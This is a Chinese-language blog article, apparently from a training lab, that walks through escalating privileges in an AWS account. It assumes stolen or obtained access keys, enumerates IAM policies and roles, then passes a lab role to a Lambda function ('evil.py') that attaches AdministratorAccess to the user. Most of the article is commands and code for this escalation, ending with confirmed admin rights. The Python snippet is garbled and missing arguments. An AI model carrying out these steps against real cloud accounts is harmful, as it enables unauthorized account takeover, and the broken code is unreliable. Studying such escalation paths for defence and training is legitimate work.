<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/pEfPURu6_Nv5M15oLDMK5A)

**国内云安全培训请点击原文或访问以下链接**

**https://www.yuque.com/u8047536/supvqp/ri4ft0**

  

**前提是已经获取了相关的密钥**

**步骤 1：****将 AWS CLI配置为访问凭证**

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/shVkAyu04IFfrE4xOgibpo4cVX32zGu78ENCqy0B8pwcE1oxNHeRnnlxeE6a2eicrDaxy6RIu7QAiaKaW2yib3pVog/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  

  

**步骤 2：列出附加到用户的AWS 托管策略**

```
aws iam list-attached-user-policies --user-name xxx aws iam list-user-policies --user-name xx
```

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/shVkAyu04IFfrE4xOgibpo4cVX32zGu78MGibMx0Y0BcrHuQiaNia1Ycj5CjQnAoWXT3wFWDibYIPHcpX64aibjOEp4Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/shVkAyu04IFfrE4xOgibpo4cVX32zGu78kvYHufibTaHZbor4Z0bHHDRwtkicYe0sycMcLnHaFhzhzRz66XqMwdbA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**步骤 3：尝试在AWS账户上创建用户**

```
aws iam create-user --user-name Bob
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

 由于权限不足，用户创建失败

  

**步骤 4： 查看策略权限和详细信息**

```
aws iam get-user-policy --user-name xx --policy-name terraform-20210211103351240800000003
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**步骤 5：列出 AWS 账户上可以传递给 Lambda 的角色**

  

```
aws iam list roles
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**步骤 6：查看 lab11lambdaiam角色详细信息**

```
`aws iam get-role --role-name lab11lambdaiam``aws iam list-role-policies --role-name lab11lambdaiam``aws iam get-role-policy --role-name lab11lambdaiam --policy-name terraform-20210212050404291100000002`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**步骤 7：创建包含以下内容的 python 脚本**

**Python Script: evil.py**

```
`import boto3``def handler(event, context): iam = boto3.client("iam")``response = iam.attach_user_policy(``User``)``return response`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**步骤8：使用zip压缩  python脚本**

```
zip evil-function.zip evil.py
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**步骤 9：在 AWS 账户上创建  lambda函数**

```
`aws lambda create-function \``--function-name evil-function \``--runtime python3.8 \``--zip-file fileb://evil-function.zip \``--handler evil.handler \``--role arn:aws:iam::6xxxxxxxxx1:role/lab11lambdaiam`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**步骤 10：调用新创建的Lambda 函数**

  

```
 aws lambda invoke --function-name evil-function invoke_out.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**步骤 11：检查xx用户的附加策略**

```
aws iam list-attached-user-policies --user-name xx
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

已成功将管理员访问策略（AdministratorAccess）附加到xx用户

  

**步骤 12：尝试 在AWS账户上创建新用户**

```
●  aws iam create-user --user-name Bob
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

已成功执行特权操作.

  

  

References:
===========

1.AWSCLI(https://docs.aws.amazon.com/cli/latest/reference/)